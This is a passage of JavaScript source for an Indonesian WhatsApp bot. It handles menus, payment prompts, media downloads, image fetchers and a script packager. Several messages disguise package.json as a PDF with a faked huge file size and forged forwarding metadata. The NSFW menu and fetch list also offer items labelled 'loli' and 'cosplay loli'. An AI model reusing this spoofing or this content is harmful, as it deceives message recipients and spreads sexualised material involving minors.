    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'List Menu',
          sections: [
            {
              title: 'List Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'MODE SAD (MODE SELF)',
                  id: '.self'
                },                
                {
                  title: 'MODE HAPPY (MODE PUBLIC)',
                  id: '.public'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: namafile,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: mode,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: idch,
   newsletterName: namach,
   },   
    externalAdReply: {
      title: namaBot,
      body: namafile,
      thumbnailUrl: thumbnail,
      sourceUrl: ch,
      mediaType: 1,
      renderLargerThumbnail: false,
    },
  },
})
}
break
case 'qris': {
    let qris = `
    *_BERIKUT ADALAH PAYMENT QRIS KAMI_*
    
    *[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\``
await Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'List Menu',
          sections: [
            {
              title: 'List Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                title: 'All Menu',
                  id: '.allmenu'
                },
                {
                  title: 'Panel Menu V1',
                  id: '.panelmenu'
                },
                {
                  title: 'Panel Menu V2',
                  id: '.panelmenu-v2'
                },                
                {
                  title: 'Panel Menu V3',
                  id: '.panelmenu-v3'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `You know apip? Yes Its ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: qris,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: '120363377429302268@newsletterr',
   newsletterName: `ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
   },    
    externalAdReply: {
      title: `© ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
      body: `ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
      thumbnailUrl: "https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg",
      sourceUrl: `https://whatsapp.com/channel/0029VbAlvk9Fsn0boxiHJX0H`,
      mediaType: 1,
      renderLargerThumbnail: false,
    },
  },
})
}
break

case 'dana': {
let dana = `
*NOMOR PAYMENT DANA KAMI ADA DI BAWAH INI}*

* *Nomor :* ${global.dana}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'List Menu',
          sections: [
            {
              title: 'List Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                title: 'All Menu',
                  id: '.allmenu'
                },
                {
                  title: 'Panel Menu V1',
                  id: '.panelmenu'
                },
                {
                  title: 'Panel Menu V2',
                  id: '.panelmenu-v2'
                },                
                {
                  title: 'Panel Menu V3',
                  id: '.panelmenu-v3'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `You know apip? Yes Its ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: dana,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: '120363377429302268@newsletterr',
   newsletterName: `ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
   },    
    externalAdReply: {
      title: `© ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
      body: `ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
      thumbnailUrl: "https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg",
      sourceUrl: `https://whatsapp.com/channel/0029VbAlvk9Fsn0boxiHJX0H`,
      mediaType: 1,
      renderLargerThumbnail: false,
    },
  },
})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'ovo': {
let ovo = `
*NOMOR PAYMENT OVO KAMI ADA DI BAWAH INI*

* *Nomor :* ${global.ovo}

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'List Menu',
          sections: [
            {
              title: 'List Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                title: 'All Menu',
                  id: '.allmenu'
                },
                {
                  title: 'Panel Menu V1',
                  id: '.panelmenu'
                },
                {
                  title: 'Panel Menu V2',
                  id: '.panelmenu-v2'
                },                
                {
                  title: 'Panel Menu V3',
                  id: '.panelmenu-v3'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `You know apip? Yes Its ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: ovo,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: '120363377429302268@newsletterr',
   newsletterName: `ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
   },    
    externalAdReply: {
      title: `© ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
      body: `ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
      thumbnailUrl: "https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg",
      sourceUrl: `https://whatsapp.com/channel/0029VbAlvk9Fsn0boxiHJX0H`,
      mediaType: 1,
      renderLargerThumbnail: false,
    },
  },
})
}
break
case 'download': {
if (!text) return reply(`Penggunaan .${command} <link>`)
Denzy.sendMessage(m.chat, {  text: `Silahkah Pilih Metode Download Yang Tersedia Di Bawah Ini  `, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'LIST METODE DOWNLOAD',
          sections: [
            {
              title: 'LIST METODE DOWNLOAD',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'TIKTOK VIDEO',
                  id: `.tt ${text}`
                },
                {
                  title: 'TIKTOK IMAGE',
                  id: `.tt ${text}`
                },                
                {
                title: 'TIKTOK AUDIO',
                  id: `.ttmp3 ${text}`
                },                
                {
                title: 'INSTAGRAM',
                  id: `.igdl ${text}`
                },                
                {
                  title: 'MEDIA FIRE',
                  id: `.mediafire ${text}`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  }, { quoted: qkontak });
}
break
case 'quotes': {
Denzy.sendMessage(m.chat, {  text: `Silahkah Pilih Quotes Yang Tersedia Di Bawah Ini  `, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'LIST QUOTES',
          sections: [
            {
              title: 'LIST QUOTES',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'QUOTES BUCIN',
                  id: `.quotesbucin`
                },
                {
                  title: 'QUOTES MOTIVASI',
                  id: `.quotesmotivasi`
                },                
                {
                title: 'QUOTES BACOT',
                  id: `.quotesbacot`
                },                
                {
                title: 'QUOTES GALAU',
                  id: `.quotesgalau`
                },                
                {
                title: 'QUOTES GOMBAL',
                  id: `.quotesgombal`
                },                
                {
                  title: 'QUOTES HENGKER WIBU EPEP TZY',
                  id: `.quoteshacker`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  }, { quoted: qkontak });
}
break
case 'nsfw': {
Denzy.sendMessage(m.chat, {  text: `Silahkah Pilih *NSFW* Yang Tersedia Di Bawah Ini`, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'LIST NSFW',
          sections: [
            {
              title: 'NSFW',
              highlight_label: 'Recommended',
              rows: [
                {
                title: 'HENTAI',
                  id: `.hentaivid`
                },
                {
                  title: 'COSPLAYER',
                  id: `.cosplay1`
                },                
                {
                title: 'WAIFU',
                  id: `.waifu1`
                },                
                {
                  title: 'ANIME',
                  id: `.anime1`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  }, { quoted: qkontak });
}
break
case 'anime': {
Denzy.sendMessage(m.chat, {  text: `Silahkah Pilih *ANIME* Yang Tersedia Di Bawah Ini`, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
      buttonText: { displayText: 'SCRIPT' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'LIST ANIME',
          sections: [
            {
              title: 'ANIME',
              highlight_label: 'Recommended',
              rows: [
                {
                title: 'RANDOM ANIME',
                  id: `.randomwaifu`
                },
                {
                title: 'ANA',
                  id: `.ana`
                },
                {
                  title: 'ART',
                  id: `.art`
                },                
                {
                title: 'ASUNA',
                  id: `.asuna`
                },
                {
                  title: 'AYUZAWA',
                  id: `.ayuzawa`
                },                
                {
                title: 'BORUTO',
                  id: `.boruto`
                },
                {
                  title: 'BTS',
                  id: `.bts`
                },                
                {
                  title: 'CHINO',
                  id: `.chiho`
                },                
                {
                title: 'COSPLAY LOLI',
                  id: `.cosplayloli`
                },
                {
                title: 'COSPLAY SAGIRI',
                  id: `.cosplaysagiri`
                },
                {
                  title: 'ELAINA',
                  id: `.elaina`
                },                
                {
                title: 'KANEKI',
                  id: `.keneki`
                },
                {
                  title: 'SHINA',
                  id: `.shina`
                },                
                {
                title: 'MIKASA',
                  id: `.mikasa`
                },
                {
                  title: 'SHIZUKA',
                  id: `.shizuka`
                },                
                {
                  title: 'YUKI',
                  id: `.yuki`
                },                
                {
                title: 'KURUMI',
                  id: `.kurumi`
                },                
                {
                title: 'KOTORI',
                  id: `.kotori`
                },
                {
                  title: 'MIKU',
                  id: `.miku`
                },                
                {
                title: 'MEGUMIN',
                  id: `.megumin`
                },
                {
                  title: 'TOUKACHAN',
                  id: `.toukachan`
                },                
                {
                  title: 'YOTSUBA',
                  id: `.yotsuba`
                },                
                {
                title: 'EMILIA',
                  id: `.emilia`
                },                
                {
                  title: 'NEZUKO',
                  id: `.nezuko`
                },                
                {
                title: 'SHINOMIYA',
                  id: `.shinomiya`
                },                
                {
                title: 'RIZE',
                  id: `.rize`
                },
                {
                  title: 'SAKURA',
                  id: `.sakura`
                },                
                {
                title: 'YULI BOCIL',
                  id: `.yulibocil`
                },
                {
                  title: 'ISUZU',
                  id: `.isuzu`
                },                
                {
                  title: 'GREMORY',
                  id: `.gremory`
                },                
                {
                title: 'ERZA',
                  id: `.erza`
                },
                {
                  title: 'KAORI',
                  id: `.kaori`
                },                
                {
                  title: 'ROSE',
                  id: `.rose`
                },                
                {
                  title: 'CHITOGE',
                  id: `.chitoge`
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  }, { quoted: qkontak });
}
break
case "createsc": {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
  if (!text) return reply(`Masukkan fitur yang diinginkan, dipisahkan dengan koma.\nContoh: ${prefix}createsc tiktok,sticker,play`);
  
  await Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
  try {
    const archiver = require('archiver');
    const path = require('path');
    const fs = require('fs');
    
    // Buat direktori temp jika belum ada
    const tempDir = './temp';
    if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true });
    }
    
    // Buat direktori untuk script custom
    const scriptName = `DenzyCostum${Math.floor(Math.random() * 10000)}`;
    const scriptDir = path.join(tempDir, scriptName);
    if (!fs.existsSync(scriptDir)) {
      fs.mkdirSync(scriptDir, { recursive: true });
    }
    
    // Buat subdirektori yang diperlukan
    const dirs = [
      'settings', 'settings/config.js',
      'lib', 'lib/database', 'lib/database/sampah',
      'lib', 'lib/database', 'lib/database/media',
      'start', 'start/lib/media',
      'start', 'start/tmp',
      'start',
      'session', 'command', 'media'
    ];
    
    dirs.forEach(dir => {
      const fullPath = path.join(scriptDir, dir);
      if (!fs.existsSync(fullPath)) {
        fs.mkdirSync(fullPath, { recursive: true });
      }
    });
    
    // Baca file makima.js asli
    const originalmakima = fs.readFileSync('./start/makima.js', 'utf8');
    
    // Ekstrak bagian awal file (sebelum switch command)
    const startPart = originalmakima.split('switch (command) {')[0];
    
    // Ekstrak bagian akhir file (setelah switch command)
    const endPart = originalmakima.split('switch (command) {')[1].split(/}(\s*)$/)[1];
    
    // Ekstrak semua case dari file asli
    const caseRegex = /case\s+(['"])([^'"]+)\1\s*:\s*{([\s\S]*?)(?=case\s+['"]|$)/g;
    const allCases = {};
    let match;
    
    while ((match = caseRegex.exec(originalmakima)) !== null) {
      const caseName = match[2];
      const caseContent = match[0];
      allCases[caseName] = caseContent;
    }
    
    // Tambahkan case menu dan help secara default
    const requestedFeatures = ['menu', 'help', ...text.toLowerCase().split(',').map(f => f.trim())];
    
    // Buat konten switch command baru
    let newSwitchContent = 'switch (command) {\n';
    
    // Tambahkan case yang diminta
    requestedFeatures.forEach(feature => {
      if (allCases[feature]) {
        newSwitchContent += allCases[feature];
      }
    });
    
    // Tutup switch statement
    newSwitchContent += '}\n';
    
    // Buat file makima.js baru
    const newmakimaContent = startPart + newSwitchContent + endPart;
    fs.writeFileSync(path.join(scriptDir, 'start/makima.js'), newmakimaContent);
    
    // Salin file-file penting lainnya
    const filesToCopy = [
      'index.js',
      'package.json',
      'module.js',
      'rahasia.js',
      'cadmin.js',
      'sticker.js'
    ];
    
    filesToCopy.forEach(file => {
      if (fs.existsSync(`./${file}`)) {
        fs.copyFileSync(`./${file}`, path.join(scriptDir, file));
      }
    });
    
    // Salin file-file di library
    const libFiles = [
      'lib/converter.js',
      'lib/exif.js',
      'lib/loader.js',
      'lib/myfunction.js',
      'lib/scraper.js',
      'lib/uploader.js'
    ];
    
    libFiles.forEach(file => {
      if (fs.existsSync(`./${file}`)) {
        fs.copyFileSync(`./${file}`, path.join(scriptDir, file));
      }
    });
    
    // Salin file-file di source
    const sourceFiles = [
      'start/lib/database.js',
      'start/lib/message.js',
      'source/payments.json',
      'source/produk.json',
      'source/saweria.json'
    ];
    
    sourceFiles.forEach(file => {
      if (fs.existsSync(`./${file}`)) {
        fs.copyFileSync(`./${file}`, path.join(scriptDir, file));
      }
    });
    
    // Salin file-file database
    const dbFiles = [
      'lib/database/contacts.json',
      'lib/database/database.json',
      'lib/database/giveaways.json',
      'lib/database/list.json',
      'lib/database/listidch.json',
      'lib/database/mode.json',
      'lib/database/owner.json',
      'lib/database/premium.json',
      'lib/database/stokdo.json',
      'lib/database/savesc/verif.js'
    ];
    
    dbFiles.forEach(file => {
      if (fs.existsSync(`./${file}`)) {
        fs.copyFileSync(`./${file}`, path.join(scriptDir, file));
      }
    });
    
    // Buat file README.md
    const readmeContent = `# ${scriptName}
    
## Bot WhatsApp Custom By ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ 

### Fitur yang tersedia:
${requestedFeatures.map(f => `- ${f}`).join('\n')}

### Cara Penggunaan:
1. Install dependencies: \`npm install\`
2. Jalankan bot: \`npm start\`

© ${namaowner} - ${new Date().getFullYear()}
`;
    
    fs.writeFileSync(path.join(scriptDir, 'README.md'), readmeContent);
    
    // Buat file ZIP
    const zipPath = path.join(tempDir, `${scriptName}.zip`);
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', {
      zlib: { level: 9 }
    });
    
    archive.pipe(output);
    archive.directory(scriptDir, false);
    
    await new Promise((resolve, reject) => {
      output.on('close', resolve);
      archive.on('error', reject);
      archive.finalize();
    });
    
    // Kirim file ZIP
    await Denzy.sendMessage(m.chat, {
      document: fs.readFileSync(zipPath),
      fileName: `${scriptName}.zip`,
      mimetype: 'application/zip',
      caption: `✅ *Script Custom Berhasil Dibuat*\n\n*Nama:* ${scriptName}\n*Fitur:* ${requestedFeatures.join(', ')}\n\nSilahkan extract file dan jalankan dengan perintah:\n\`\`\`npm install && npm start\`\`\``
    }, { quoted: m });
    
    // Hapus file temporary
    fs.rmSync(scriptDir, { recursive: true, force: true });
    fs.unlinkSync(zipPath);
    
    reply('✅ Script custom berhasil dikirim!');
  } catch (err) {
    console.error('Error creating custom script:', err);
    reply(`❌ Terjadi kesalahan saat membuat script:\n${err.message}`);
  }
}
break
case 'welcome': {
let wlc = `𝘗𝘭𝘦𝘢𝘴𝘦 𝘚𝘦𝘭𝘦𝘤𝘵 𝘍𝘰𝘳 𝘋𝘪𝘴𝘢𝘣𝘭𝘦/𝘌𝘯𝘢𝘣𝘭𝘦 𝘞𝘦𝘭𝘤𝘰𝘮𝘦`
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 1
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: wlc
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namaBot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./Denzy.jpg')}, { upload: Denzy.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: namafile,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
             {
  "name": "single_select",
"buttonParamsJson": 
`{
  "title": "WELCOME MODE",
  "sections": [
    {
      "title": "${namaBot}",
      "rows": [
        {
          "header": "WELCOME OFF",
          "title": "click to display",
          "description": "This For Disable Welcome",
          "id": ".welcome2 off"
        },
        {
          "header": "WELCOME ON",
          "title": "click to display",
          "description": "This For Enable Welcome",
          "id": ".welcome2 on"
        }
      ]
    }
  ]
}`

              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner","id":".owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"YouTube▶️","id":".yt"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 9999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363377429302268@newsletterr',
                  newsletterName: namafile,
                  serverMessageId: 142
                }
                }
        })
    }
  }
}, {})

await Denzy.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
           }
break
case "welcome2": {
if (!isDenzyCreator) return Denzy.sendMessage(from, {audio: fs.readFileSync('./media/vn/ayanggua.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
if (!text) return Reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
if (text.toLowerCase() == "on") {
if (welcome) return Reply("*Welcome* Sudah Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = true
Reply("Berhasil Menyalakan *Welcome ✅*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else if (text.toLowerCase() == "off") {
if (!welcome) return Reply("*Welcome* Sudah Tidak Aktif!\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
welcome = false
Reply("Berhasil Mematikan *Welcome ❌*\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot")
} else {
return Reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'hinata': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'neko2': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
reply('Wait....')
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
